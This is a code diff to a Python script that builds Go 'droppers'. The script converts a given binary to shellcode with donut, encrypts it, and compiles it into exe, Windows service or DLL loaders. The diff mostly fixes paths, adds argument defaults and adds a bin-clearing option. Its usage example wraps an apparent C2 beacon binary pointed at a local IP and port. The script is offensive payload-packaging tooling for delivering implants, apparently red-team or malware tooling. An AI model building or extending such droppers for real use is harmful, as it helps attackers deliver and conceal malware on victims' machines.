@@ -9,8 +9,8 @@ from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
 
 def donutTheExe(binaryPath: str, binaryArg: str):
-    donutPath = os.path.join(Path(__file__).parent, '../ressources/donut')
-    shellcodePath =os.path.join(Path(__file__).parent, '../bin/binary.bin') 
+    donutPath = os.path.join(Path(__file__).parent.parent, 'ressources/donut')
+    shellcodePath =os.path.join(Path(__file__).parent.parent, 'bin/binary.bin') 
 
     print(donutPath, shellcodePath)
 
@@ -37,7 +37,7 @@ def donutTheExe(binaryPath: str, binaryArg: str):
         print("[-] Failed to create the shellcode")
         exit(1)
 
-    print("[+] Shellcode Created and saved in " + shellcodePath)
+    print("[+] Shellcode Created and saved in " + shellcodePath + "\n")
     return shellcodePath
     
 
@@ -63,19 +63,19 @@ def cipherShellcode(shellcodePath: str):
     with open(keyPath, 'wb') as f:
         f.write(key)
 
-    print("[+] Ciphered Shellcode and Generated Key in bin/")
+    print("[+] Ciphered Shellcode and Generated Key in bin/\n")
 
     return cipheredShellcodePath, keyPath
 
 
 def generateDllGoDroplet(outputPrefix:str, arch: str):
     extension = ".dll"
-    mainGoPath = "../cmd/dll64bit/main.go"
+    mainGoPath = "cmd/dll64bit"
 
-    dllbitsPath = os.path.join(Path(__file__).parent, '../bin/' + outputPrefix + arch + extension)
-    dllbitsGoMainPath = os.path.join(Path(__file__).parent, mainGoPath)
+    dllbitsPath = os.path.join(Path(__file__).parent.parent, 'bin/' + outputPrefix + arch + extension)
+    dllbitsGoMainPath = os.path.join(Path(__file__).parent.parent, mainGoPath)
 
-    args = ("go", "build", "-a", "-buildmode", "c-shared", "-o", dllbitsPath, dllbitsGoMainPath)
+    args = ("go", "build", "-a", "-buildmode", "c-shared", "-o", dllbitsPath)
 
     popen = None
     exebits_env = os.environ.copy() 
@@ -89,7 +89,7 @@ def generateDllGoDroplet(outputPrefix:str, arch: str):
     print("[+] Creating " + arch + " dll droplet")
 
     try:
-        popen = subprocess.Popen(args, stdout=subprocess.PIPE, env=exebits_env)
+        popen = subprocess.Popen(args, stdout=subprocess.PIPE, env=exebits_env, cwd=dllbitsGoMainPath)
         popen.wait()
         if popen.stdout != None:
             output = popen.stdout.read()
@@ -114,11 +114,11 @@ def generateDllGoDroplet(outputPrefix:str, arch: str):
 def generateGeneralExeGoDroplet(outputPrefix: str, arch: str, service: bool):
 
     extension = ".svc.exe" if service else ".exe" 
-    mainGoPath = "../cmd/svc64bit/main.go" if service else "../cmd/exe64bit/main.go"
+    mainGoPath = "cmd/svc64bit/main.go" if service else "cmd/exe64bit/main.go"
     serviceLogStrin = " service" if service else ""
 
-    exebitsPath = os.path.join(Path(__file__).parent, '../bin/' + outputPrefix + arch + extension)
-    exebitsGoMainPath = os.path.join(Path(__file__).parent, mainGoPath)
+    exebitsPath = os.path.join(Path(__file__).parent.parent, 'bin/' + outputPrefix + arch + extension)
+    exebitsGoMainPath = os.path.join(Path(__file__).parent.parent, mainGoPath)
     args = ("go", "build", "-a", "-ldflags", "-s -w", "-o", exebitsPath, exebitsGoMainPath)
 
     popen = None
@@ -185,23 +185,43 @@ def generateGoDroplets(binaryPath: str, binaryArg: str, format: str, outputPrefi
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Generate the Go droplets given a binary.")
-    parser.add_argument("--path", type=str, required=True, help="Path to the binary to be wrapped to create the Go dropper")
-    parser.add_argument("--arg", type=str, required=True, help="Argument that are needed for the binary")
+    parser = argparse.ArgumentParser(description="Generate the Go droplets given a binary.", epilog='Example: python3 scripts/GenerateGoDroplets.py --path="/home/kali/Desktop/BeaconHttp.exe" --arg="192.168.1.191 8080 http" --format="all" --output="droplet"')
+    parser.add_argument("--path", type=str, required=False, help="Path to the binary to be wrapped to create the Go dropper")
+    parser.add_argument("--arg", type=str, required=False, help="Argument that are needed for the binary", default="")
     parser.add_argument("--format",
                         choices=["exe", "svc", "dll", "all"],
-                        required=True,
+                        required=False,
                         type=str,
-                        help="Format of the droplet, can be exe, svc, dll or all of the above")
-    parser.add_argument("--output", type=str, required=True, help="Output File Prefix")
+                        help="Format of the droplet, can be exe, svc, dll or all of the above",
+                        default="exe")
+    parser.add_argument("--output", type=str, required=False, help="Output File Prefix", default="droplet")
+    parser.add_argument('--clear', action='store_true', help='Just Clear the bin directory. If specified will not build anything.', required=False)
 
     args = parser.parse_args()
+
+    if args.clear:
+        print("[+] Will Delete bin/*")
+        directory = os.path.join(Path(__file__).parent.parent, 'bin/')
+        for item in os.listdir(directory):
+            item_path = os.path.join(directory, item)
+            
+            if item == '.gitignore':
+                continue
+            
+            if os.path.isfile(item_path):
+                os.remove(item_path)
+        print("[+] Deleted bin/*")
+        exit(0)
+
+    if not args.path:
+        print("You need a path. Run help.")
+        exit(1)
+
     binaryPath = args.path
     binaryArg = args.arg
     format = args.format
     outputPrefix = args.output
 
-    print(binaryPath, binaryArg, format)
     generateGoDroplets(binaryPath, binaryArg, format, outputPrefix)
 
 if __name__ == "__main__":
